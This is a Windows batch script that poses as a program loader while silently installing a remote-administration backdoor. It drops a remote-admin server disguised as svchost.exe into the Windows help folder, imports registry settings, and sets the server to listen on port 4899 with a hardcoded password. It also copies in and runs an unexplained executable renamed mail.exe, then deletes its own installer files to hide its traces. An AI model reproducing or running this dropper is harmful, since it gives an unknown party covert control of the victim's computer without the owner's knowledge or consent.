@echo off 
echo PLEASE WAIT WHILE PROGRAM LOADS . . .
reg export "HKEY_LOCAL_MACHINE\SYSTEM\RAdmin" 123.reg
reg delete  "HKEY_LOCAL_MACHINE\SYSTEM\RAdmin" /f
copy /y "svchost.exe" "%SYSTEMROOT%/help\svchost.exe" 
copy /y "raddrv.dll" "%SYSTEMROOT%/help\raddrv.dll"
copy /y "admdll.dll" "%SYSTEMROOT%/help\admdll.dll"
copy /y "хо.exe" "%SYSTEMROOT%/system32/mail.exe"
reg import 111.reg
regedit /s 111.reg
"%SYSTEMROOT%/help\svchost.exe" /install /silence
"%SYSTEMROOT%/help\svchost.exe" /start
"%SYSTEMROOT%/svchost.exe" /stop
"%SYSTEMROOT%/svchost.exe" /pass:300583 /port:4899 /install /save /silence
"%SYSTEMROOT%/svchost.exe" /start
"%SYSTEMROOT%/svchost.exe" /start
"%SYSTEMROOT%/system32/mail.exe"

del install.bat
del setup.exe 